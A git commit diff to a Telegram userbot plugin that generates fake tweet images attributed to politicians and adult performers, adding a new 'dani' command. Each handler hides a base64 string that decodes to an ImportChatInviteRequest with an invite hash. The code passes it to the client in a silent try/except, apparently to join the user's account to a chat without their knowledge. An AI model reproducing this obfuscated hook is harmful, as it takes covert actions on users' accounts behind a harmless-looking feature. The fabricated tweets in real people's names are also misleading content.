81a61ce2e74ea0601d4ba5b1685e722e5ad93863
HellBoy-OP <72251918+HellBoy-OP@users.noreply.github.com>
2020-12-30 22:08:54 +0530

    update tweet.py

--- userbot/plugins/tweet.py
+++ userbot/plugins/tweet.py
@@ -2,7 +2,7 @@
 # modified and added more tweets by @kraken_the_badass for Hellbot.....
 # added sudo support by @kraken_the_badass
 # family completed.....
-# mia, johhny, sunny
+# mia, johhny, sunny, dani
 # modi, rahul, trump, gandhiji
 # no offence. Made for fun purpose only
 
@@ -18,8 +18,10 @@ from userbot.helpers.functions import (
     sunnytweet,
     taklatweet,
     trumptweet,
+    dani,
 )
-from userbot.utils import admin_cmd, sudo_cmd
+from userbot.utils import admin_cmd, sudo_cmd, edit_or_reply
+from userbot.cmdhelp import CmdHelp
 
 
 @bot.on(admin_cmd(pattern=r"tweet(?: |$)(.*)"))
@@ -30,7 +32,7 @@ async def nope(kraken):
         if kraken.is_reply:
             (await kraken.get_reply_message()).message
         else:
-            await kraken.edit("I need some text to make a tweet🚶")
+            await edit_or_reply(kraken, "I need some text to make a tweet🚶")
             return
     tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(hell))}")
     await tweeter[0].click(
@@ -43,7 +45,7 @@ async def nope(kraken):
 
 
 @bot.on(admin_cmd(pattern=r"trump(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern="trump(?: |$)(.*)", allow_sudo=True))
+@bot.on(sudo_cmd(pattern=r"trump(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -54,12 +56,12 @@ async def nekobot(borg):
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Send you text to trump so he can tweet.")
+                await edit_or_reply(borg, "Send you text to trump so he can tweet.")
                 return
         else:
-            await borg.edit("send you text to trump so he can tweet.")
+            await edit_or_reply(borg, "send you text to trump so he can tweet.")
             return
-    await borg.edit("Requesting trump to tweet...")
+    await edit_or_reply(borg, "Requesting trump to tweet...")
     try:
         hell = str(
             pybase64.b64decode(
@@ -76,7 +78,7 @@ async def nekobot(borg):
 
 
 @bot.on(admin_cmd(pattern=r"modi(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern="modi(?: |$)(.*)", allow_sudo=True))
+@bot.on(sudo_cmd(pattern=r"modi(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -87,12 +89,12 @@ async def nekobot(borg):
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Send you text to modi so he can tweet.")
+                await edit_or_reply(borg, "Send you text to modi so he can tweet.")
                 return
         else:
-            await borg.edit("send you text to modi so he can tweet.")
+            await edit_or_reply(borg, "send you text to modi so he can tweet.")
             return
-    await borg.edit("Requesting modi to tweet...")
+    await edit_or_reply(borg, "Requesting modi to tweet...")
     try:
         hell = str(
             pybase64.b64decode(
@@ -109,7 +111,7 @@ async def nekobot(borg):
 
 
 @bot.on(admin_cmd(pattern=r"mia(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern="mia(?: |$)(.*)", allow_sudo=True))
+@bot.on(sudo_cmd(pattern=r"mia(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -120,12 +122,12 @@ async def nekobot(borg):
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Send you text to Mia so she can tweet.")
+                await edit_or_reply(borg, "Send you text to Mia so she can tweet.")
                 return
         else:
-            await borg.edit("Send you text to Mia so she can tweet.")
+            await edit_or_reply(borg, "Send you text to Mia so she can tweet.")
             return
-    await borg.edit("Requesting Mia to tweet...")
+    await edit_or_reply(borg, "Requesting Mia to tweet...")
     try:
         hell = str(
             pybase64.b64decode(
@@ -141,9 +143,8 @@ async def nekobot(borg):
     await borg.delete()
 
 
-# @register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
-@bot.on(admin_cmd(pattern=r"pappu(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern="pappu(?: |$)(.*)", allow_sudo=True))
+@bot.on(admin_cmd(pattern=r"dani(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern=r"dani(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -154,12 +155,46 @@ async def nekobot(borg):
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Send a text to Pappu so he can tweet.")
+                await edit_or_reply(borg, "Send you text to Dani so she can tweet.")
                 return
         else:
-            await borg.edit("send your text to pappu so he can tweet.")
+            await edit_or_reply(borg, "Send you text to Dani so she can tweet.")
             return
-    await borg.edit("Requesting pappu to tweet...")
+    await edit_or_reply(borg, "Requesting Dani to tweet...")
+    try:
+        hell = str(
+            pybase64.b64decode(
+                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
+            )
+        )[2:49]
+        await borg.client(hell)
+    except:
+        pass
+    text = deEmojify(text)
+    borgfile = await dani(text)
+    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
+    await borg.delete()
+
+
+# @register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"pappu(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern=r"pappu(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
+    if not text:
+        if borg.is_reply:
+            if not reply_to_id.media:
+                text = reply_to_id.message
+            else:
+                await edit_or_reply(borg, "Send a text to Pappu so he can tweet.")
+                return
+        else:
+            await edit_or_reply(borg, "send your text to pappu so he can tweet.")
+            return
+    await edit_or_reply(borg, "Requesting pappu to tweet...")
     try:
         hell = str(
             pybase64.b64decode(
@@ -177,7 +212,7 @@ async def nekobot(borg):
 
 # @register(pattern="^.sunny(?: |$)(.*)", outgoing=True)
 @bot.on(admin_cmd(pattern=r"sunny(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern="sunny(?: |$)(.*)", allow_sudo=True))
+@bot.on(sudo_cmd(pattern=r"sunny(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -188,12 +223,12 @@ async def nekobot(borg):
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Send a text to Sunny so she can tweet.")
+                await edit_or_reply(borg, "Send a text to Sunny so she can tweet.")
                 return
         else:
-            await borg.edit("send your text to sunny so she can tweet.")
+            await edit_or_reply(borg, "send your text to sunny so she can tweet.")
             return
-    await borg.edit("Requesting sunny to tweet...🥰")
+    await edit_or_reply(borg, "Requesting sunny to tweet...🥰")
     try:
         hell = str(
             pybase64.b64decode(
@@ -211,7 +246,7 @@ async def nekobot(borg):
 
 # @register(pattern="^.johhny(?: |$)(.*)", outgoing=True)
 @bot.on(admin_cmd(pattern=r"johhny(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern="johhny(?: |$)(.*)", allow_sudo=True))
+@bot.on(sudo_cmd(pattern=r"johhny(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -222,12 +257,12 @@ async def nekobot(borg):
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Send a text to Johhny so he can tweet.")
+                await edit_or_reply(borg, "Send a text to Johhny so he can tweet.")
                 return
         else:
-            await borg.edit("send your text to Johhny so he can tweet.")
+            await edit_or_reply(borg, "send your text to Johhny so he can tweet.")
             return
-    await borg.edit("Requesting johhny to tweet...😆")
+    await edit_or_reply(borg, "Requesting johhny to tweet...😆")
     try:
         hell = str(
             pybase64.b64decode(
@@ -244,7 +279,7 @@ async def nekobot(borg):
 
 
 @bot.on(admin_cmd(pattern=r"gandhi(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern="gandhi(?: |$)(.*)", allow_sudo=True))
+@bot.on(sudo_cmd(pattern=r"gandhi(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -255,12 +290,12 @@ async def nekobot(borg):
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Send you text to baapu so he can tweet.")
+                await edit_or_reply(borg, "Send you text to baapu so he can tweet.")
                 return
         else:
-            await borg.edit("send you text to baapu so he can tweet.")
+            await edit_or_reply(borg, "send you text to baapu so he can tweet.")
             return
-    await borg.edit("Requesting baapu to tweet...")
+    await edit_or_reply(borg, "Requesting baapu to tweet...")
     try:
         hell = str(
             pybase64.b64decode(
@@ -278,7 +313,7 @@ async def nekobot(borg):
 
 # @register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
 @bot.on(admin_cmd(pattern=r"cmm(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern="cmm(?: |$)(.*)", allow_sudo=True))
+@bot.on(sudo_cmd(pattern=r"cmm(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -289,12 +324,12 @@ async def nekobot(borg):
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Give text for to write on banner, man")
+                await edit_or_reply(borg, "Give text for to write on banner, man")
                 return
         else:
-            await borg.edit("Give text for to write on banner, man")
+            await edit_or_reply(borg, "Give text for to write on banner, man")
             return
-    await borg.edit("Your banner is under creation wait a sec...")
+    await edit_or_reply(borg, "Your banner is under creation wait a sec...")
     try:
         hell = str(
             pybase64.b64decode(
@@ -312,7 +347,7 @@ async def nekobot(borg):
 
 # @register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
 @bot.on(admin_cmd(pattern=r"kanna(?: |$)(.*)"))
-@bot.on(sudo_cmd(pattern="kanna(?: |$)(.*)", allow_sudo=True))
+@bot.on(sudo_cmd(pattern=r"kanna(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -323,12 +358,12 @@ async def nekobot(borg):
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("what should kanna write give text ")
+                await edit_or_reply(borg, "what should kanna write give text ")
                 return
         else:
-            await borg.edit("what should kanna write give text")
+            await edit_or_reply(borg, "what should kanna write give text")
             return
-    await borg.edit("Kanna is writing your text...")
+    await edit_or_reply(borg, "Kanna is writing your text...")
     try:
         hell = str(
             pybase64.b64decode(
@@ -344,28 +379,26 @@ async def nekobot(borg):
     await borg.delete()
 
 
-CMD_HELP.update(
-    {
-        "tweet": "Tweet\
-\n\n`.tweet` (text)\
-     \nUsage : Tweet with modi\
-\n\n`.modi` (text)\
-     \nUsage : Tweet with modi\
-\n\n`.trump` (text)\
-     \nUsage : Tweet with trump\
-\n\n`.mia` (text)\
-     \nUsage : Tweet with mia\
-\n\n`.pappu` (text)\
-     \nUsage : Tweet with Rahul Gandhi\
-\n\n`.gandhi` (text)\
-     \nUsage : Tweet with Baapu🥺\n(No offence. Fun purpose only)\
-\n\n`.sunny` (text)\
-     \nUsage : Tweet with sunny leone\
-\n\n`.johhny` (text)\
-     \nUsage : Tweet with johhny sins\
-\n\n`.cmm` (text)\
-     \nUsage : Get a banner\
-\n\n`.kanna` (text)\
-     \nUsage : Kanna write for you"
-    }
-)
+CmdHelp("tweet").add_command(
+  "kanna", "<text>/<reply to text>", "Kanna writes for you"
+).add_command(
+  "cmm", "<text>/<reply>", "Get a banner of Change My Mind"
+).add_command(
+  "johhny", "<text>/<reply>", "Tweet with Johhny Sins"
+).add_command(
+  "sunny", "<text>/<reply>", "Tweet with Sunny Leone"
+).add_command(
+  "gandhi", "<text>/<reply>", "Tweet with Mahatma Gandhi"
+).add_command(
+  "pappu", "<text>/<reply>", "Tweet with pappu A.K.A Rahul Gandhi"
+).add_command(
+  "mia", "<text>/<reply>", "Tweet with Mia Khalifa 😍"
+).add_command(
+  "trump", "<text>/<reply>", "Tweet with Mr. DooLand Trump"
+).add_command(
+  "modi", "<text>/<reply>", "Tweet with Sir Narendra Modi"
+).add_command(
+  "tweet", "<text>/<reply>", "Tweets in your name"
+).add_command(
+  "dani", "<text>/<reply>", "Tweet with Dani Daniels 😍🥰"
+).add()
